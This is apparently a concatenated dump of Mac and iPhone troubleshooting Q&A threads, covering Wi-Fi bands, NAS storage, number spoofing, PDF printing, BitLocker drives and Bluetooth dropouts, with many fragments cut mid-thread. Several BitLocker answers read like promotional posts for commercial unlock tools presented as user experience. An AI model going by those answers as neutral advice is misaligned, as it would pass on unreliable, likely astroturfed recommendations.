undoing the network name updates for the 5.0Ghz network and the 2.4Ghz network back to their default names and restarting the Router, but still no luck.\nHere's how I fixed it:\nAfter a lot of hacks including testing on another MacBook Pro I decided to restart my MacBook Pro, and this time I was able to see the 5.0Ghz network under my MacBook Pro list of networks. I tried to connect to it as well and it worked fine.\nIf you don't get to see the 5.0Ghz network under your MacBook Pro list of networks, you may want to restart your MacBook Pro again and then open System Preferences -> Network -> Wi-Fi -> Network Name to list all available networks, and you should see and connect to the 5.0Ghz network.\n\nThat's all\n\nA: Avast Security can add proxy wifi settings in the network settings. Since updating to Monterey, the 5GHz connection is slow and non-responsive, however no issue with the 2.4GHz. This was fixed by simply removing Avast from settings/network, click on Avast and hit \"-\" and apply.

Or quite expensive but using an Intel Xeon CPU. I see there is no option for a Intel Core CPU, and I'm concerned at the unit being under powered with an Atom CPU.\nI have a 2012 Mac mini with a i7 CPU c. 2.5ghz which is a decommissioned work machine. The hard drive in side of it is too small for the tasks above, but is there a way I could attach a large external drive array with RAID via USB 3 and run the Mac mini in Server mode to accomplish what I want to do without buying a Synology NAS? \n\nA: \nI have a 2012 Mac mini with a i7 CPU c. 2.5ghz....is there a way I could attach a large external drive array with RAID via USB 3 and run the Mac mini in Server mode to accomplish what i want to do without buying a Synology NAS ?\n\nA \"large\" enclosure?  No.  The biggest USB 3 Direct Attached Storage device I've seen was a 5 bay unit made by Drobo (I won't have those anywhere near my data centers because of their reliability issues).  Can you expand them?  Sure, by purchasing another enclosure.  As long as you have free USB 3 ports, you can add another unit.  \nPromise makes the Pegasus 3 Thunderbolt RAID enclosures that can hold up to 8 drives but they're horribly expensive.\nSo, (IMO) DAS really isn't a cost effective solution in the long run which, ultimately means the Mac mini isn't a great file server to begin with.  Additionally, macOS also lacks critical support for things like iSCSI making it a poor choice for a storage server.\nI would go with the NAS as it's much more cost effective, feature rich, and flexible.  To the contrary, running macOS (an OS more oriented to the desktop rather than a server) just adds way too many layers of complexity to your storage equation.\n\nA: A NAS is precisely designed for one specific thing and that is to manage and serve files over a network connection. While a lot of NAS devices also offer other features (I have a QNAS device that acts as a Plex server, a Time Machine Server and as a Dropbox host) they are still basically intended as a simple file server.\nYou wrote that, \"...im concered at the unit being underpowered with an Atom CPU\" Yet you then ask if using a seven year old Mac with a large RAID array attached to it instead.\nYou are comparing apples and oranges here. The Atom CPU in the NAS is running an OS optimized for use managing large amounts of storage and serving them over the network. Whereas the Mac is designed to be a general purpose home computer. Meaning that while it could do what you are asking it is not optimized for that function.\nThere is a reason that Linux (and other Unix variants) are the most popular OS for servers, they perform better.\nUnless you need your NAS to do a lot more than just serve files over a network (transcoding video, running a bittorrent client and a bunch of other things all at once) stick with the NAS as they are simple, reliable appliances designed to serve files, quickly and with minimal fuss and upkeep.\nThen use the Mini, hooked up to your TV, for Netflix, Amazion Video, Hulu, Plex, Airplay, or whatever you want as they make lovely TV media players and give you a readily accessible Mac in your living room. That's what I did with a similar Mini.\n", "Q: What iPhone mail application is this? What iPhone application for mail is this please?

Yes, this is possible and you may have it configured from Settings to receive SMS through your email. As pointed in this related question cant get my number to change from email to my phone number\n\nMessages is NOT sending a message via email. It is simply using the email (which is likely your Apple ID), as an identifier of your device. This lets other Apple users send you a message to either your phone number or email address. This is useful on iPads, iPod Touch, and Macs, who can not send to phone numbers, because they do not have phone service.

I have access to Single-User, Recovery, and Terminal.\n\nA: Since your Mac is MDM managed, you might not have the flexibility to manage making a new admin user by deleting the .AppleSetupDone file if that also triggers it being managed as an enrolled device.\nThe simple way to get a new account from a folder named /Users/login is to just open the system preferences, add a new user with that as the full name and then inherit the files from the file system and the new user is set.\nYou do need a valid admin account / password to type in but you don’t need to have an admin account itself logged in to make the new user. \nThe simple way to get admin credentials in a MDM mac is to get help from the IT staff - just let them know you need temporary admin credentials or a full admin account - they can push that or relay the user/password to use. Then you can go back to the simple way above - make a new account that shares the short name with the desired folder and you’re done.\n", "Q: Easiest way to transfer files from iPhone to Linux?

As soon as I did this my screen went pixelated (just like if you added noise on photoshop) and the display started to jump around. I turned it off and back on and it seemed to be fine. Around a week later while running Android Studios, it happened again but much worse. Turned it off again, however, was unable to turn it back on. \nThe guys at the genius bar informed me that there is an issue with the display and they will need to replace the whole top of the Mac costing around $800 and take 10 working days.

I haven't tried reformatting it yet but could it help? Anyone else experienced this or something similar?\n\nA: \nHow could updating to the latest OS have caused this to have happened\n  or could it just be a coincidence? \n\nIt's entirely a coincidence.  Many times, people incorrectly correlate an activity they are doing at the time with failure of an unrelated component.  You could have been doing a Time Machine backup, just the same, it it would have failed.\n\nI haven't tried reformatting it yet but could it help? \n\nYou don't need to.  You can boot into Internet Recovery which is the same as booting into a \"fresh\" install of macOS.  You can also install macOS onto a flash disk and boot from there to test.  There's no need to reinstall over your existing data to see if you can fix your display.\n\nThe guys at the genius bar informed me that there is an issue with the\n  display and they will need to replace the whole top of the Mac\n\nYes, you definitely have an issue with your display.  However, I'm not convinced that it's your screen as it could be your GPU, backlight or the LVDS connector/cable.  I would take it in to a different, reputable shop for a second opinion.

I used iTunes to rip a CD of a homemade audio recording of a friend. iTunes thought it recognized the CD but was way off (it guessed a lecture series about ancient history).\nHowever, when I looked at the actual CD's content via Finder, oddly enough, it was divided into arbitrary 5-minute tracks, and two of the tracks had names corresponding to what iTunes had guessed (about ancient history) and the others were generically named.\nI have no idea if there were tracks or track titles before I imported it with iTunes. Having either of these doesn't make any sense as it's an hour-long speech without logical places for tracks let alone to name one of them \"Byzantine Empire\". (Also what's curious about this is that the actual speaker's first name is the same as the professor of ancient history that iTunes had guessed. I'm wondering if there was some metadata on the CD when I received it, which iTunes used to make this conclusion.)\nSo I have to ask: Is iTunes capable of changing the metadata on the actual CD to match what it thought it was? The CD is probably read-only (I don't have permission to change it to \"Read & Write\" in Get Info), but maybe iTunes has a work-around.\n\nA: Audio CDs contain no metadata at all. They are also incapable of being written to. \nThe data, as @dwightk guessed, is stored locally after consulting the CDDB. If the 'album' in question has never correctly been reported to the CDDB, as is often the case for home recording or limited distributions, then it can make poor guesses. \nIt was certainly possible at one time to correctly report an album back to CDDB to give them the correct data, but I haven't done this in 10 years or more & no longer remember the procedure, sorry.\nAs far as I'm aware - again this is not something I can test right now, once iTunes has fetched the data from the CDDB, it then a)saves it to any converted MP3/AAC files it makes & b) saves the 'original data' with a fingerprint to recognise the same CD if inserted again, so it doesn't have to perform the lookup in future.\nDeleting this will only make it find the same incorrect data a second time, so your 'fix' is to get the CDDB updated with correct information. I would guess the data is stored inside the iTunes Library.xml, which is not a structure you can readily edit. Perhaps deleting the \"CD\" whilst it is inserted would clear the data & make it consult the CDDB again, once their data has been corrected.\nLate addition\nI found this link which sets out how to send the data; it claims to work for iTunes but I cannot test it.\n7 Steps To Add Your Songs To The CDDB Database\n\n  \n*\n  \n*Insert the CD (whether homemade, replicated or duplicated from a master image) in your computer CD drive  \n  \n*Do not import the CD yet  \n  \n*Select all the tracks, right click and select Get Info\n  \n*Click the Info tab and enter the album title, artist name, year and genre\n  \n*Right click in each song title fields (Track 1, Track 2, etc.) or double click to edit to  the individual track names. Double-check for\n  typos and make sure you have the track order correct.\n  \n*When you are all done, click, OK.  \n  \n*If you want other users to also be able to see the correct album title, artist information, and track titles, highlight all the tracks\n  again, go up to the top menu bar, and click Advanced / Submit Track\n  Names to upload them to the CDDB Database. That’s it.  \n  \n*If you want the database update to happen a bit faster than a few days, repeat this process from another computer/iTunes account. This\n  speeds the Gracenote “verification” process up because you are\n  essentially “verifying” the database entry from another computer.\n  \n\n", "Q: Apparently I’m calling random numbers but there's nothing in the call log For the last few weeks I’ve had random calls from people saying that I called them, but there is nothing in my call log. I'm running the latest iOS.\nAny suggestions as to what is happening here, and should I be alarmed enough to restore my phone?\n\nA: Contact you carrier/provider to verify that those calls are taking place on your account. If it turns out to be bogus, your carrier/provider probably has a procedure to deal with spoofing.\n\nA: These calls are not likely coming from your phone.  Rather, some robo caller is likely spoofing the caller ID using your number.  The FCC website says \n\nWhat can you do if your number is being spoofed?\nIf you get calls from people saying your number is showing up on their\n  caller ID, it's likely that your number has been spoofed. We suggest\n  first that you do not answer any calls from unknown numbers, but if\n  you do, explain that your telephone number is being spoofed and that\n  you did not actually make any calls. You can also place a message on\n  your voicemail letting callers know that your number is being spoofed.\n  Usually scammers switch numbers frequently. It is likely that within\n  hours they will no longer be using your number.\n\n\nA: to add to the above answer, usually a spoofed number lasts for a few hours. this could also be happening by a possible 3rd part app that has been allowed access to make phone calls\n\nA: This practice is likely what is often called “neighbor spoofing” and has nothing to do with your phone. \n", "Q: PDF Printing Quality Issues I am having problems with printing some PDF documents on a 2014 MacBook Pro running macOS 10.14.3.\nMost PDF documents print fine (from Preview), and I'm happy with the quality.\nExamples are these two:\n\n\nHowever, I'm having issues with a specific paper.\nIn Adobe Reader and Preview, the quality looks good, and the letters are very sharp.\nBut something different happens when I print:\nFirstly, from Preview:\n\nNow from Adobe Reader:\n\nThis is annoying. \nWhy is it doing this? Presumably there's a problem with the pdf. But what could it be, and how can I fix it? The pdf looks fine in Preview and Adobe!\nFor reference, this is the paper I am trying to print.\n\nA: I have observed this problem before: seemingly solid-tone 100%K text or other vector image in a PDF gets printed out with a 'dotted' pattern.\nThe problem is caused by color definitions in the PDF file, which get rasterised into 'half-tone'. So you end up with an object that is 100% Black, but comprised of dots, rather than solid tone.\nThe solution is to make sure that Color Matching is switch to \"In Printer\" and NOT to \"ColorSync\". This for Preview and other Apple apps. In Acrobat, use \"No Color Management\".\nI printed sample pages from your exemplar PDF, and they were fine. The PDF is non-optimal, admittedly, as there is Transparency and mixed CMYK and RGB objects.\n\nA: If you’re having issues with a single PDF and not others, the issue is with that file and not with your viewing application (Preview, Acrobat, etc.)\nThe problem comes from how the PDF was rendered.  The lower the DPI, the less data there is to render graphics.  What’s rendered for the screen doesn’t necessarily translate to a good rendering on printed output.  For example, 50 DPI (for text) might look just fine on your screen, but to get clear text in print, you likely need about 200 DPI.\nAdditionally, the paper may have been rendered as an image when the PDF was created rather than a native PDF text document.\nUnfortunately, there’s no way to fix this other than re-rendering the document.  If you don’t have access to the original, you may be able to OCR it, use your favorite editing tool (Word, Pages, etc.) to “remaster” it, and then render that document with a higher DPI.\n", "Q: 2015 Macbook Air screen gradually dimming and dying This is not a problem at booting up.

Since the entire display assembly is sealed, you will need to replace the whole item and it is quite expensive - $650+ USD.  \nIf it's not addressed, the issue will continue to get worse until the display stays black permanently.\nI would still take it into Apple and see if they'll help you out, but this is unlikely to be resolved without incurring some expense.\n\nA: As already mentioned by Allan, it is a flexgate issue.\nAlthough I am not totally sure for the MacBook Air 2015, you likely don't need to replace the whole assembly as cable repair by cable on cable welding by a skilled technician may fix the problem.\nThe repair cost will of course depend on the country and the company doing it, but is usually around 2/3 (or even less) of thus of a screen replacement.\nWatch these videos about similar problem for the 15'' MacBook Pro A1707:\n\n*\n\n*Cause the problem: https://www.youtube.com/watch?v=OqHUYNZVLfM\n\n*Flexgate permanent solution: https://www.youtube.com/watch?v=neigIMBUQf0\n\n*Complete repair process: https://www.youtube.com/watch?v=5nBiN8Uujlw\n", "Q: How does installing XCode, Visual Studio and Unity on my mac impact my computer's speed? Most of the time I use my mac computer for graphics design but I enjoy coding too. Since clean-installing macOS a few months ago, I avoided installing XCode, Unity and Visual Studio for fear that with all their dependencies, they might bog down my aging computer.\nHowever I wonder whether this is the actual case given that osx apps tend to be statically linked and self-contained.\nDo these three Dev Tools slow my computer down somehow by their mere existence, or is it only disk space that they occupy when I am not using them?\n\nA: No, they do not slow your computer down by their mere existence. Yes, they will occupy disk space.\nIt hasn't got anything to do with them being statically linked.\n\nA: It won't slow your Mac unless your using it, it does occupy the space. But incase you run all the 3 programs mentioned simultaneously then there will be a affect in the speed. \nLet's get straight to the point\nSpeed depends on the ram or the primary memory (in general) therefore just by installing and not turning it on won't consume and ram, but yes there will be a small impact in speed when you run them.\n", "Q: Removing configuration profiles via command line Is there a way to remove configuration profiles as root?\nSo far I have tried the following:\n$ sudo su -\n$ find / -name profile # trying in the following folder\n$ cd /private/var/db/ConfigurationProfiles/Settings\n$ chmod 777 com.apple.managed.PlugInKit.plist # operation not permitted\n$ mv -f com.apple.managed.PlugInKit.plist com.apple.managed.PlugInKit.plist.old # operation not permitted\n\nAny force moves, copies, removes, or chmods are not permitted even though I am an administrator.

After I turn on my laptop again, why does 'iPhone' never appear on my laptop's WiFi list automatically? I have waited 10, 30, 60 mins, and repeated this process 5 times.\nThen  I enter Settings > PH, change nothing, and see no changes. 3 mins. later, iPhone appears on my laptop's WiFi list.\n\nA: The problem is with the iOS Personal Hotspot feature. By design, the network is discoverable only when the Hotspot screen is open. This means that your PC can't find the network when waking up/rebooting. Unfortunately there seems to be no workaround, I was looking for the same thing for my old car stereo, and I ultimately ended up getting a dedicated personal hotspot for it.\nThe only workaround is to open the Personal Hotspot screen every time you restart/wake up the PC.\n\nA: By default, Windows does not do \"Bonjour\", which is Apple's discovery protocol. If you have a Mac or iPad, you've likely noticed that your iPhone shows up after just a few seconds if they're both connected to the same iCloud account.\nYou may have better luck after installing Bonjour for Windows. Unfortunately I've long been rid of any \"true\" Windows PC's so I can't test it for you.\nWhen Bonjour is enabled, part of the discovery can be over Bluetooth for power reasons, so you may want to check whether your Windows box supports Bluetooth and has it enabled.\nTo identify whether the problem is on the Windows side or the Apple side, I suggest checking whether your iPhone shows up on a Mac/iPad connected to the same iCloud account.\n\nA: This seems to be more of a Windows questions.\nAt first glance this might be your problem (and possible solution): https://answers.microsoft.com/en-us/windows/forum/windows_10-networking/wifi-fails-to-automatically-re-connect-after-sleep/2596b501-366a-4b82-a5fd-4466eae7caad?auth=1\n", "Q: How can I gain access to the Windows 10 BitLocker encrypted drive on Mac OSX? My friends send me a USB drive which has been encrypted with a password in Windows 10 before. There are many important photos for our travel. But when I inserted it on my MacBook. It gave me the windows that the disk was not readable by this computer. I have the password and can not access the drive to get what I want!! Bad mood. \nCan anyone give me suggestions? I search online and found there is a tool called iSunshare BitLocker Genius. Did anyone use it before? I know nothing about computer, just want the simplest way to get the photos and share the happy times with my family. Help!\n\nA: By default, we couldn't open, read and write a BitLocker drive on Mac. But take it easy, the BitLocker Genius tool is a really simple and user-friendly tool that can help you get access to the BitLocker drive without any data loss.\nWhen you meet \"The disk you inserted was not readable by this computer\" error, you can click on Ignore button. I'm also a user that know little about computer. But I insert the drive to Mac and type my password then that drive is able to work normally.\nBesides, you can unlock the BitLocker encrypted drive on Mac using a recovery key as well.\n\nA: To the best of my knowledge neither Apple nor Microsoft offer a way to read a Bitlocker encrypted drive on macOS.\nA little searching turned up a utility called \"M3\" from a company called M3 Data Recovery that purports to enable Macs to read Bitlocker encrypted drives.\nNote that I have ZERO experience or knowledge of this utility, how good it is, how well it works, or anything else. So use it at your own risk.\nPersonally I'd just ask whoever sent you the encrypted drive to just put the files on an unencrypted drive. Or give them an ExFAT formatted USB key of sufficient size and ask them to put the files there.\n\nA: If you have the password, and you know that the drive works in Windows, then I think the simplest way would be to borrow a computer with Windows and copy the files off the drive to another drive that you can use with your Mac. Alternatively, get a copy of Windows and run on your Mac with VirtualBox, VMWare, etc.., should be able to copy the files to your host Mac system with shared directory or something. It looks like you can download a Windows ISO here, which you would use to create the virtual machine on your Mac, not sure if you need a registration key just to install and load the OS, in my past experiences you've been able to get to the desktop without registering.\n\nA: Apple still does not provide an official tool to access BitLocker encrypted driver on Mac. Mostly because BitLocker is a patent protected technology. You have to use third-party apps to complete the job up to now.\nOn My MacBook Pro with Catalina, I am able to unlock a BitLocker HDD with UUByte BitLocker Geeker. After that, I can easily read files from or write files to that drive.\n\nA: Have you resolved your question? Normally, you cannot access a drive encrypted with Windows BitLocker on Mac OS X because Mac OS X doesn’t support BitLocker. To access a BitLocker drive on Mac OS X, you have to firstly connect the drive to a Windows computer and then simply go to Control Panel > System and Security > BitLocker Drive Encryption to turn off BitLocker encryption on this drive. If you cannot find any Windows machine, you have to use a third-party utility to access the BitLocker drive on Mac OS X. I found this utility called BitLocker Reader for Mac at Google. You can give it a try. Good luck.\n\nA: macOS only can read an NTFS volume but can't Write and Copy files from an NTFS formatted drive. Only FAT32 or exFAT. And Bitlocker is a Windows encryption program which is not supported on macOS,so,you may need a professional utility to unlock bitlocker-encrypted drive on your macOS, or you can open BitLocker USB drive on Mac using Virtualbox.\nSee more: https://www.sysgeeker.com/how-to-open-bitLocker-encrypted-drive-on-mac.html\n", "Q: Is paid Apple Developer Program subscription required to distribute test IPA file?

This machine is logged in with his Apple account (I have the credentials) and I would like to reset it and start using it as my own machine with my own Apple account.\nHowever, I would like to backup the machine before resetting in case he needs some files from it (he should have retrieved the files already but I’d like to be safe). My concerns are as follows.  \n\n\n*\n\n*He has moved back to the Windows ecosystem and no longer possesses a Mac.  \n\n*Once I reset the machine with my own Apple account, I don’t know if I will have issue accessing the backup as it might be attached to his Apple account.  \n\n*I prefer a non-cloud solution, for example, a disk image that can be amounted (ideally from a Windows machine; please see (1)).  \n\n*If I back up the machine (storage capacity 128 GB) to an external disk with larger capacity, I would like that the unoccupied space of the disk is usable (ideally both with Windows and Mac).\n\n\nHow do I best proceed please? Please be detailed if you can as this will be my first Mac exp; however, please assume an otherwise generally competent tech user.\n\nA: As the end result is to be able to access any forgotten files from a Windows computer in future, rather than to be able to restore to a new Mac, I would forget trying to backup the drive in its current form. \nThe OS & apps themselves would be of no use; & could easily be re-acquired if ever needed, as they will belong to that user's Apple ID. It would also be reasonably safe to assume that any 'hidden' files wouldn't be portable to Windows - unless the machine was previously used for programming/coding. [Let us know if that's the case.]\nThat leaves you with, essentially, \"Documents\".\nThese would to a large extent be cross-platform, in & of themselves - txt, rtf, jpg, mp3, etc etc\nI'd say in that case that simply copying the entire User folder [Macintosh HD/Users/username/] would be more than enough. If you copy it to a drive formatted as ExFAT, it can live there as just another folder, accessible from any OS. You will probably be saving 'too much' data that way, but it will save having to make individual decisions on the contents of each sub-folder.\nThis solution does, of course, ignore any security considerations.

According to the documentation it should offer charging at up to 65W which is plenty for the MacBook.\nI have however not tested this specific adapter with the MacBook.\n", "Q: MBP on TB3-Dock ignores USB-Devices until reconnect There are two usecases for my MacBookPro15,1: When I am on the road I just use it as it is without any peripheral devices. But when I am at home, I put it (with closed lid) in the book arc and connect it to my thunderbolt3-dock (Kensington SD5000T). The dock is connected to ethernet, two displays (via TB3-to-2x-DP Adapter) and my USB-Audio-Interface (RME Fireface UC). Additionally I use a Bluetooth Kebyboard and a BT-Trackpad.\nEverything works fine except the audio interface. That only works after reconnect.\nI suspect some security feature of the OS that ignores all formerly unconnected USB-Devices before login. But I am not sure about this.\nIts getting on my nerves to reconnect the audio interface every single time. So I want my macbook to recognize this device automatically. Maybe its possible to rescan USB after login or mark this audio interface as trusted device somehow?\n\nUPDATE\nAs jksoegaard suggested, I tested whether the USB recognition problem is related to the TB3-Dock. It is not. Here is how to reproduce:\n\n\n*\n\n*Have the open MacBook on the desk with nothing connected.\n\n*Make sure its locked\n\n*Plug in a USB device, for example a microSD Cardreader with card in it.\n\n*Wake up and unlock the macbook (password, TouchID, Applewatch,...)\n\n*Notice: The plugged-in USB-Device is not recognized at all (not even unmounted as onik suggested in his comment)\n\n*Disconnect and reconnect the USB-Device\n\n*Notice: Device is recognized correctly\n\n\nAs I remember correctly, I already know this behavior from my old MBP (early 2013), since I bought it back then.\nFor the sake of completeness, I also tested this behavior with my MBP from work (Generation 2018, 13\" Touchbar). It is exactly the same there.\n\nUPDATE 2\njksoegaard pointed out that my last update was confusing because I used a USB cardreader for testing instead of the audio interface. For clarification: the cardreader was meant to be a generic usb device (which is not the audio interface) for testing. But as it seems, storage devices are something different.\nAs I tried out to connect the interface to the macbook directly, the problem got weird. There seem to be two cases.\nFirst:\n\n\n*\n\n*switch audio interface off\n\n*connect to macbook (does not matter if locked or not)\n\n*switch on audio interface\n\n*audio interface is recognized correctly\n\n\nSecond:\n\n\n*\n\n*Audio interface is switched on and was last used in via the TB3-Dock connect audio-interface directly to macbook (does not matter if locked or not)\n\n*audio interface is not recognized\n\n*Disconnect and reconnect audio interface (does not matter what port or how often I try)\n\n*audio interface is still not recognized\n\n\nThat makes the audio interface look like the root cause of the problem. But I do not understand why it behaves completely different on the TB3-Dock. If connected via the dock, there is no interface power cycle needed, because reconnecting works at the latest.\nThis leaves me a little puzzled, as i do not know how to pin down the problem further. Any advice?\n\nA: To my knowledge, there's no such security feature in macOS.\nOn my system I can easily connect the MacBook Pro with a closed lid to my dock (OWC Dock) and USB devices automatically reconnect.\nI would test if this happens with all USB devices, or just with the audio interface. \nIn case it is generic, contact Kensington support to report the problem. I have checked their web site, and it seems they have no firmware updates or the like available for the product.\nIn case it is specific to the audio device, contact RME to report the problem, and check if they have firmware updates, driver updates or similar available.\n", "Q: Timemachine backups to Encrypted APFS partition.

For context, a wired connection achieved latencies of 61ms playing Tapt, and 106ms using the iOS keyboard. The AirPods had latencies of 251ms and 296ms respectively, in the same tests.\nEven the worst offender in my previous test, the JBL Flip 2, achieved significantly shorter latencies (218ms and 258ms, respectively). In contrast, my £30 Brainwavz Bluetooth eabuds achieved respective latencies of 199ms and 249ms in the same two tests.\nI would theorise that perhaps the need to ensure both AirPods play sounds in sync necessitates some small amount of additional communication, and thus latency. Hopefully it's something that could be improved with software updates in future. Of course any wireless technology is going to be slower than a contemporary wired solution, and I didn't expect the AirPods' latency to be on par with wired audio, but their failure to beat the latency of much cheaper Bluetooth earbuds is a downer.\n\nHowever, it could be taken with some grain of salt as it an almost 2 year old article and software updates may indeed have fixed the noted latency issue.

However, Windows 10 ISO with latest update is larger than 4G so you have to format the USB to exFAT32 before burning.\nHere are the tools that work fine on Mojave 10.14 5 on my MacBook Pro:\nhttps://www.balena.io/etcher/\nhttps://www.uubyte.com/iso-editor.html\nYou can also set up a Windows virtual machine on Mojave and burn the iso to USB with Rufus or Windows Media Creation Tool\n", "Q: What is 'Time Profile'? In System Preferences > Keyboard > Services > Development, I see options for 'Time Profile Active Application', 'Time Profile App Under Mouse', and 'Time Profile Entire System'.\nWhat do these things do?\nI've searched Google for \"Time Profile\" and \"Time Profile Active Application\", but no results show for that. Well, the later shows 4 total results on the interwebs, which none are useful in explaining what the program is.\nI'm on MacBook Pro Mojave. I happened to find these options when I was adding the Finder right-click option for 'New Terminal At Folder'. After enabling all of them, I didn't see any new options related to 'Time Profile', but I do see the Terminal option.\n\n\nA: They're shortcuts for developers to start time profiling an app using Instruments, which is a developer tool that's installed alongside Xcode. https://en.wikipedia.org/wiki/Instruments_(software)\n", "Q: Why can't my laptop stay connected to WiFi when locked? My laptop isn't staying connected to it's wireless connection when I lock it. I set up an alias using this post and tried to follow the instructions from this one, and those didn't work for me either. My prefs for en0 (the wireless interface) are as follows:\nAirPort preferences for en0:\n\nDisconnectOnLogout=NO\nUnable to retrieve JoinMode\nJoinModeFallback=DoNothing\nRememberRecentNetworks=YES\nRequireAdminIBSS=NO\nRequireAdminNetworkChange=NO\nRequireAdminPowerToggle=NO\nWoWEnabled=YES\n\nAnd the alias I use to lock the screen is:\nalias lockscreen='/System/Library/CoreServices/\"Menu Extras\"/User.menu/Contents/Resources/CGSession -suspend'\n\nMy system info is below as well:\n\nAny recommendations or any ideas of what I'm doing wrong? I don't believe this is a duplicate of the other question since the answers in there didn't work for me, so any advice would be appreciated.\nEdit: Going to my username and clicking Login Window... to lock the screen also disconnects the WiFi.\n\nA: All right, so I've figured out a way to do it. I tried using the command pmset displaysleepnow, and it works as intended. The additional thing is that you have to go to System Preferences > Security & Privacy > General and require a password immediately after the computer display goes to sleep. I then set up an alias:\nalias lscreen='pmset displaysleepnow'\n\nand it works as intended. I use the terminal a lot, so lscreen is an easy way for me to lock my screen and come back with my screen being locked but both my WiFi and VPN still connected.\n", "Q: Problem in defaults command when adding app with blanks in name to dock I would like to add an app to my dock via a command.

I haven't even restarted it, unless it autoupdated and restarted itself\nUpdate:\nI allowed it eventually and nothing happened as far as I can see, all the keys are still where they are supposed to be, contrary to some comments. \n\nA: I seem to have fixed this... unfortunately I don't know what part of what I tried was the actual key to the fix.\nI spoke to Skype support, live chat. They hadn't heard of the issue - though tbh, 1st line support are always going to be 'last to know'.\nThe best I could get was 'Have you tried reinstalling it?\" I said, it's a Mac, reinstalling isn't going to make any difference.\nWe tried it - it didn't. No surprise there.\nI did it again, this time using CleanMyMac to get all the prefs & hidden stuff, kexts etc; rebooted & tried again. It still remembered my login details so I'm not sure how successful that was.\nI looked in keychain to see what was in there. I was surprised at how many bits & pieces there were.\nHaving made sure I knew my login details, I deleted the whole lot; everything that came up when I searched 'skype' - maybe 10 or 12 keys - & rebooted again.\nSkype had lost my auto-login... good.\nI could then see which new keys it added as I completed a manual login.\nThere were only two keys - Skype for Desktop & Skype for Desktop MSA. After several days there are still only two.\nNo functionality seems to have been lost. Conversation histories etc appear to be stored at Skype, not on the local Mac.\nIt hasn't asked me to export anything since.\nIt would probably be useful if someone else with this issue could try deleting only the Keychain entries, or only doing the 'clean' reinstall; reboot & see how that goes. See if we can figure whether it's the 'clean' reinstall or the keychain deletion that actually fixes it.\nNote: This machine has a complete line-of-sight migration path back to my first OS X Mac in 2005 & some data from before that, when I migrated from OS 9. Skype has been on it since it was invented, so I may have a whole lot more historic cruft than most people.\n\nA: I found this.

Also an external display Dell U2715H. I've been working for a few months with MBP 2012 and it worked flawlessly, the monitor was connected via DP to mDP cable. Then my 2012 MBP died on me and I replaced it with 2018 MBP. I connected the display via Satechi USB-C hub with mDP slot. \nAnd with this new setup, my Trackpad started to suddenly drop Bluetooth connections from time to time. It randomly disconnects-connects for 4-5 times over a few seconds. So, it's obviously not a Trackpad or some Wi-Fi router interferences issue because it worked just fine with the old MBP. I tried a few things that did not help:\n\n\n*\n\n*Uninstall LittleSnitch (I've read somewhere that it might interfere)\n\n*Connected USB-C hub to the right side (tried different slots)\n\n*Reset Bluetooth module\n\n*Disabled handoff \n\n*Connect/disconnect Bluetooth devices\n\n*Charged devices to 100%\n\n\nApple support wasn't helpful either.\nAt first, disconnects happened only with Trackpad but not Magic Keyboard which I thought is super weird but later the keyboard started to disconnect as well.\nI read a few reports by people claiming that's the issue in the USB-C hub interfering with Bluetooth signal, so I tested a day without the USB hub and connections weren't dropped, so I decided that's the issue and bought myself a DP to USB-c cable to replace the hub for the display connection. But to my surprise, it did not help. \nI installed Bluetooth PacketLogger and got these error logs during the disconnects:\n12:54:25.383  L2CAP Receive    0x000C  Trackpad           Connection Request -

Sounds like there's an interference with Bluetooth after all. \nAt this point, I'm inclined to think that the MBP 2018 just has a bad Bluetooth module (or poor design that causes signal interferences) and to resolve it for good you'll need to buy an external Bluetooth adapter.\n\nA: I have this issue again and it seems the main reason is the interference between Bluetooth and WiFi frequencies. Updating to 5Ghz WiFi fixed the issue for me before in the old office but replacing a perfectly fine router with the new that supports 5Ghz is not really a solution. \nSome people claim it to be a driver issue since Yosemite but I don't think so because my MBP 2012 worked flawlessly until it died in late 2018 and I had these issues with MBP 2018 since I bought it. So, my take is that it's a hardware issue caused by a bad design.\nUPDATE: I've once again confirmed that switching to 5Ghz WiFi network fixes the issue. It doesn't matter whether you have both 2.4Ghz and 5Ghz enabled in your router as long as MBP connected to 5Ghz. I can't express enough how disappointing this is to have this issue in a so expensive laptop in its 3rd generation.\n\nA: My endless research on this problem makes me think there's a hardware design issue in these 2018 MBPs. Or at least a firmware bug.\nSome people report switching from the left to the right USB-c ports fix it, others resort to a new Bluetooth adapter/dongle. Still others say moving items on their table/desktop (physical) was the solution. I also read from someone that fixed it by turning off wi-fi and using a wired network connection.\nIn my case was avoiding weak wi-fi networks.\nAll in all, look for radio frequency activity in your environment. The solution is probably in the physical world, not in the software. \nUnless Apple comes out, admits a defect, and provides an official fix this problem doesn't have a universal solution. It will require some tweaking and flipping things around you. At least that is my impression.\n\nA: I had this problem too, but I discovered that it only happens if I have my MacBook Pro on a vertical stand behind my external display. \nI now think that the external display is partially shielding the Bluetooth signal between my MacBook Pro and my Magic Trackpad 2. When I moved the MacBook Pro to the left of the external display, the problem went away. \n\nA: Placing the trackpad to the left of my MBP works well, while to the right it loses connection all the time.\nI have observed and can reliably reproduce this significant difference.\nIt is an old trackpad (A1339) and a new-ish MBP (2018, 15in w/ touch bar) on an elevated stand (3 inches off the desk).\n\nA: I'm late to answer this -- but I was experiencing the same exact issue today and wanted to provide an update in the event it can help someone else.\nMy issues:\n\n*\n\n*When Magic trackpad 2 was connected via Bluetooth, it kept disconnecting, connecting briefly, and then disconnecting.\n\n\n*When Magic keyboard with Numeric Pad was connected via Bluetooth, it kept disconnecting, connecting briefly, and then disconnecting.\nMy Setup:\n\n*\n\n*MacBook Pro (15-inch, Mid 2012) connected via WiFi to my home network\n\n*macOS Catalina - Version 10.15.7\n\nWhat resolved my issues:\n\n*\n\n*Switching OFF WiFi on my macbook pro.\n\n\n*Connecting to the internet via ethernet.\nI do not understand exactly why I keep experiencing this same issue with Bluetooth connected devices while my macbook pro is connected to WiFi -- but this is the solution that has worked for me. Hope this helps.\n", "Q: FaceTime: unable to answer incoming calls on macOS I have an iPhone and a MacBook using the same wireless network.\n\n\n*\n\n*I am able to make a call on my Mac (Mojave) with FaceTime using my iPhone, the call works without any problem.\n\n*When receiving a call I get the following popup:\n\n\n\nHowever, after clicking on \"Accept\" I get the following error:\n\nI signed out and in on each device without any improvement.

